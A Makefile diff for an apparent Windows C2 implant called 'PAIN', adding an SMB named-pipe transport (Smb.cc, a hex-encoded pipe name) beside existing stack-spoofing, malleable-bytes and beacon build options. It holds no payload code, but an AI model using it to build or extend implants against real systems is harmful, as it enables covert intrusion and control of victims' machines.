@@ -21,6 +21,10 @@ PAIN_STACK_SPOOF ?= 1
 PAIN_MALLEABLE_BYTES ?= "{0x00}"
 PAIN_CALLBACK_COUNT  ?= 0
 PAIN_ROTATION        ?= 0
+# SMB profile settings (only used when PAIN_PROFILE_C2=PROFILE_SMB)
+PAIN_PROFILE_C2  ?= 0x25
+# Pipe name as a hex byte array matching the PAIN_MALLEABLE_BYTES pattern (no quoting issues)
+PAIN_PIPE_NAME   ?= {0x5c,0x5c,0x2e,0x5c,0x70,0x69,0x70,0x65,0x5c,0x70,0x61,0x69,0x6e,0x00}
 # UUID is now generated at agent runtime - no compile-time value needed
 
 # Complier Flags - Cross-compile for windows
@@ -45,7 +49,9 @@ CXXFLAGS = -target x86_64-w64-mingw32 \
 		   -DPAIN_STACK_SPOOF=$(PAIN_STACK_SPOOF) \
 		   -DPAIN_MALLEABLE_BYTES=$(PAIN_MALLEABLE_BYTES) \
 		   -DPAIN_CALLBACK_COUNT=$(PAIN_CALLBACK_COUNT) \
-		   -DPAIN_ROTATION=$(PAIN_ROTATION)
+		   -DPAIN_ROTATION=$(PAIN_ROTATION) \
+		   -DPAIN_PROFILE_C2=$(PAIN_PROFILE_C2) \
+		   -DPAIN_PIPE_NAME=$(PAIN_PIPE_NAME)
 
 
 # Output file as a PE COFF object file
@@ -70,6 +76,7 @@ CXX_OBJ = $(OBJ_DIR)/LdrLoad.o \
 		  $(OBJ_DIR)/Parser.o	\
 		  $(OBJ_DIR)/Config.o    \
 		  $(OBJ_DIR)/Http.o      \
+		  $(OBJ_DIR)/Smb.o       \
 		  $(OBJ_DIR)/Transport.o \
 		  $(OBJ_DIR)/Tasks.o      \
 		  $(OBJ_DIR)/Beacon.o      \
@@ -131,6 +138,10 @@ $(OBJ_DIR)/Config.o: Source/Comm/Config.cc
 	@$(CXX) $(CXXFLAGS) -c $< -o $@
 
 $(OBJ_DIR)/Http.o: Source/Comm/Http.cc
+	@echo "[CXX] $<"
+	@$(CXX) $(CXXFLAGS) -c $< -o $@
+
+$(OBJ_DIR)/Smb.o: Source/Comm/Smb.cc
 	@echo "[CXX] $<"
 	@$(CXX) $(CXXFLAGS) -c $< -o $@
 
